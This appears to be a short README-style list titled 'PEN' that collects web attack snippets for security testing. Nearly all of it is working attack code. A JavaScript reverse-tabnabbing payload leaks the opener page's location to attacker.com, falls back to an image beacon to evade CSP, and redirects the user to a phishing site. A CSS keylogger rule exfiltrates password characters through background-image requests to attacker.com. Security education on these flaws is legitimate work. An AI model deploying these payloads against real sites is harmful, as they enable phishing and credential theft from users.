# PEN
A curated list of script and attack for security testing purposes and knowledgement.  
  
## JavaScript:
  - #### `target="_blank"` vulnerability:
    ```javascript
    if (window.opener && window.opener.location) {
      // Imagine this script as a library added to an attacker official website.
      // If this site is opened by an user that clicked to an `a` element
      // with target attribute setted to '_blank', the browser will initialize an `opener` object,
      // referred to the browser window which the user came from.
      // This weakness could be used to redirect the opener window to a phishing site.

      let randomUserID = Math.random().toString().slice(2,),
        urlStartPhishing =
          `//attacker.com/new/phishing/?location=${window.opener.location}&user=${randomUserID}`,
        redirect2Phishing = () => {
          // Wait for the deployment of the phishing site.
          setTimeout(() => {
            window.opener.location =
              `https://attacker.com/${randomUserID}/${window.opener.location}`

          }, 8000)
        };

      fetch(urlStartPhishing)
        .then(response => {
          redirect2Phishing()
        })
        .catch(err => {
          // Error, maybe CSP :(

          let bypassCSP = new Image();
          bypassCSP.src = urlStartPhishing;
          redirect2Phishing()
        });
    }
    ```  
    References:
    - https://dev.to/ben/the-targetblank-vulnerability-by-example
  
## CSS:
  - #### CSS Keylogger: 
    ```css
    input[type="password"][value$="a"] {
      background-image: url("https://attacker.com/a");
    }
    ```  
    References:
    - https://github.com/maxchehab/CSS-Keylogging
    - https://hackaday.com/2018/02/25/css-steals-your-web-data/
